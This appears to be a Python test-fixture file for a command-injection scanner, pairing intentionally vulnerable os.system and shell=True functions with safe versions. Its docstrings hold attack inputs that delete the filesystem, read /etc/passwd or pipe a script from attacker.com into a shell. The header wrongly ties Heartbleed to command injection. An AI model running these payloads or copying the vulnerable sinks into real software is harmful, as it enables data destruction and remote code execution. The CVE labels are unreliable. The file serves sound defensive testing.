"""
OS Command Injection Test Fixtures

CWE-78: OS Command Injection
CVE-2014-0160: Heartbleed (command injection component)
CVE-2021-44228: Log4Shell (includes command injection)
"""

import os
import shlex
import subprocess

# ==================================================
# VULNERABLE: os.system() (MOST DANGEROUS)
# ==================================================


def command_injection_vulnerable_1(filename: str):
    """
    ❌ CRITICAL: os.system with user input

    Real attack: filename = "; rm -rf /"
    Result: Deletes entire filesystem
    """
    # VULNERABLE: os.system always uses shell
    os.system(f"cat {filename}")  # SINK: os.system


def command_injection_vulnerable_2(url: str):
    """
    ❌ CRITICAL: Command chaining

    Real attack: url = "http://example.com; curl attacker.com/shell.sh | bash"
    Result: Remote code execution
    """
    # VULNERABLE: Shell metacharacters
    os.system(f"wget {url}")  # SINK


def command_injection_vulnerable_3(user_input: str):
    """
    ❌ CRITICAL: Command substitution

    Real attack: user_input = "$(whoami)"
    Result: Command substitution executed
    """
    # VULNERABLE: Backticks and $()
    os.system(f"echo User input: {user_input}")  # SINK


# ==================================================
# VULNERABLE: subprocess with shell=True
# ==================================================


def command_injection_vulnerable_4(directory: str):
    """
    ❌ CRITICAL: subprocess.call with shell=True

    Real attack: directory = "/tmp && cat /etc/passwd"
    Result: Leaks sensitive files
    """
    # VULNERABLE: shell=True enables injection
    subprocess.call(f"ls -la {directory}", shell=True)  # SINK: subprocess.call


def command_injection_vulnerable_5(ip_address: str):
    """
    ❌ CRITICAL: subprocess.run with shell=True
    """
    # VULNERABLE
    result = subprocess.run(
        f"ping -c 1 {ip_address}",
        shell=True,
        capture_output=True,  # DANGER!
    )  # SINK: subprocess.run

    return result.stdout


def command_injection_vulnerable_6(log_file: str):
    """
    ❌ CRITICAL: subprocess.Popen with shell=True
    """
    # VULNERABLE
    proc = subprocess.Popen(
        f"tail -f {log_file}",
        shell=True,
        stdout=subprocess.PIPE,  # DANGER!
    )  # SINK: subprocess.Popen

    return proc


def command_injection_vulnerable_7(port: str):
    """
    ❌ CRITICAL: subprocess.check_output
    """
    # VULNERABLE
    output = subprocess.check_output(f"netstat -an | grep {port}", shell=True)  # DANGER!  # SINK

    return output


# ==================================================
# VULNERABLE: os.popen()
# ==================================================


def command_injection_vulnerable_8(search_term: str):
    """
    ❌ CRITICAL: os.popen (deprecated but still used)
    """
    # VULNERABLE: os.popen always uses shell
    pipe = os.popen(f"grep '{search_term}' /var/log/app.log")  # SINK: os.popen

    return pipe.read()


# ==================================================
# VULNERABLE: Complex scenarios
# ==================================================


def command_injection_vulnerable_9_multiline(commands: str):
    """
    ❌ CRITICAL: Multi-command injection

    Real attack: commands = "ls; curl attacker.com | sh"
    """
    # VULNERABLE
    script = f"""
    #!/bin/bash
    cd /tmp
    {commands}
    """

    os.system(script)  # SINK


def command_injection_vulnerable_10_env(user_var: str):
    """
    ❌ CRITICAL: Environment variable injection

    Real attack: user_var = "x; malicious_command"
    """
    # VULNERABLE: Even environment variables!
    os.environ["USER_VAR"] = user_var
    os.system("echo $USER_VAR")  # SINK


# ==================================================
# SAFE: subprocess without shell (BEST PRACTICE)
# ==================================================


def command_injection_safe_1_list_form(filename: str):
    """
    ✅ SECURE: subprocess with list (shell=False)

    When arguments are passed as list, shell metacharacters are ignored.
    """
    # SAFE: List form, no shell
    result = subprocess.run(["cat", filename], capture_output=True)  # List form!

    return result.stdout


def command_injection_safe_2_no_shell(directory: str):
    """
    ✅ SECURE: subprocess.call without shell
    """
    # SAFE: shell=False (default)
    subprocess.call(["ls", "-la", directory])


def command_injection_safe_3_ping(ip_address: str):
    """
    ✅ SECURE: Ping with list form
    """
    # SAFE
    result = subprocess.run(["ping", "-c", "1", ip_address], capture_output=True, timeout=5)

    return result.stdout


def command_injection_safe_4_popen(log_file: str):
    """
    ✅ SECURE: Popen with list
    """
    # SAFE
    proc = subprocess.Popen(["tail", "-f", log_file], stdout=subprocess.PIPE)

    return proc


# ==================================================
# SAFE: Input sanitization with shlex.quote()
# ==================================================


def command_injection_safe_5_shlex_quote(filename: str):
    """
    ✅ SECURE: Using shlex.quote() for shell escaping

    Note: Still prefer list form, but shlex.quote() is OK when shell needed.
    """
    # SAFE: shlex.quote() escapes shell metacharacters
    safe_filename = shlex.quote(filename)

    # Now safe to use in shell
    os.system(f"cat {safe_filename}")


def command_injection_safe_6_pipes_quote(user_input: str):
    """
    ✅ SECURE: Legacy pipes.quote() (Python 2)
    """
    import pipes  # Deprecated but still works

    # SAFE: pipes.quote() (Python 2 equivalent)
    safe_input = pipes.quote(user_input)

    os.system(f"echo {safe_input}")


# ==================================================
# SAFE: Input validation (Defense in depth)
# ==================================================


def command_injection_safe_7_allowlist(command_name: str):
    """
    ✅ SECURE: Command allowlist
    """
    # Allowlist of safe commands
    ALLOWED_COMMANDS = {"ls", "cat", "grep", "find"}

    if command_name not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")

    # SAFE: Validated command
    subprocess.run([command_name, "-h"])


def command_injection_safe_8_validated_ip(ip_address: str):
    """
    ✅ SECURE: IP address validation
    """
    import ipaddress

    # Validate input (defense in depth)
    try:
        ipaddress.ip_address(ip_address)
    except ValueError:
        raise ValueError("Invalid IP address")

    # SAFE: Validated + list form
    result = subprocess.run(["ping", "-c", "1", ip_address], capture_output=True, timeout=5)

    return result.stdout


def command_injection_safe_9_path_validation(filename: str):
    """
    ✅ SECURE: Path validation
    """
    import os.path

    # Validate path
    if not os.path.basename(filename) == filename:
        raise ValueError("Invalid filename")

    if ".." in filename:
        raise ValueError("Path traversal attempt")

    # SAFE
    subprocess.run(["cat", f"/safe/dir/{filename}"])


# ==================================================
# SAFE: Use library functions instead of shell commands
# ==================================================


def command_injection_safe_10_native_python(directory: str):
    """
    ✅ SECURE: Use Python libraries instead of shell

    Best practice: Don't shell out if Python can do it natively!
    """
    import os

    # SAFE: Use os.listdir() instead of "ls"
    files = os.listdir(directory)

    return files


def command_injection_safe_11_pathlib(filepath: str):
    """
    ✅ SECURE: Use pathlib instead of shell
    """
    from pathlib import Path

    # SAFE: Use Path.read_text() instead of "cat"
    content = Path(filepath).read_text()

    return content


# ==================================================
# EDGE CASE: shell=True when necessary
# ==================================================


def command_injection_safe_12_shell_features(pattern: str):
    """
    ✅ SECURE: When you MUST use shell features

    Sometimes shell features (pipes, wildcards) are needed.
    In that case: shlex.quote() + input validation.
    """
    import re

    # Strict validation
    if not re.match(r"^[a-zA-Z0-9_.-]+$", pattern):
        raise ValueError("Invalid pattern")

    safe_pattern = shlex.quote(pattern)

    # SAFE: Validated + quoted
    result = subprocess.run(f"find /tmp -name '{safe_pattern}' | wc -l", shell=True, capture_output=True)

    return result.stdout
